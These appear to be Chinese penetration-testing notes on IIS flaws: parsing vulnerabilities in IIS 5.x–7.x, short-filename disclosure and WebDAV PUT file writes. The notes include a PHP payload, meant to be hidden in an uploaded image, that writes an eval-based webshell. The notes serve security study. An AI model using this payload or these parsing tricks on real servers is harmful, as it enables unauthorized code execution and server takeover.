# 1、目录解析漏洞

在 IIS5.x/6.0 中，默认会将  `**.asp（*.asa、*.cer、*.cdx ）`目录下的所有文件当成Asp解析

# 2、文件名解析漏洞

在 IIS5.x/6.0 中，默认会将 `**.asp;（*.asa;.jpg、*.cer;.jpg）` 这种格式的文件名，当成Asp解析，是因为服务器默认不解析; 号及其后面的内容，相当于截断

# 3、畸形解析漏洞

IIS7.x版本 在Fast-CGI运行模式下,在任意文件，例:1.jpg后面加上/.php，会将1.jpg 解析为php文件。
我们可以上传图片马，然后在后面加上.php 或者1.php。可以被解析成PHP文件。
或者我们可以在图片马test.jpg中写入下面的代码：
`&lt;?php fputs(fopen('shell.php','w'),'<?php @eval($_POST\[pass\])?&gt;')?>`

# IIS 短文件漏洞
Windows 以 8.3 格式生成与 MS-DOS 兼容的(短)文件名，以允许基于 MS-DOS 或 16 位 Windows的程序访问这些文件。在cmd下输入"dir /x"即可看到短 文件名的效果。

# PUT 任意文件写入
IIS Server 在 Web 服务扩展中开启了 WebDAV之后，支持多种请求，配合写入权限，可造成任意文件写入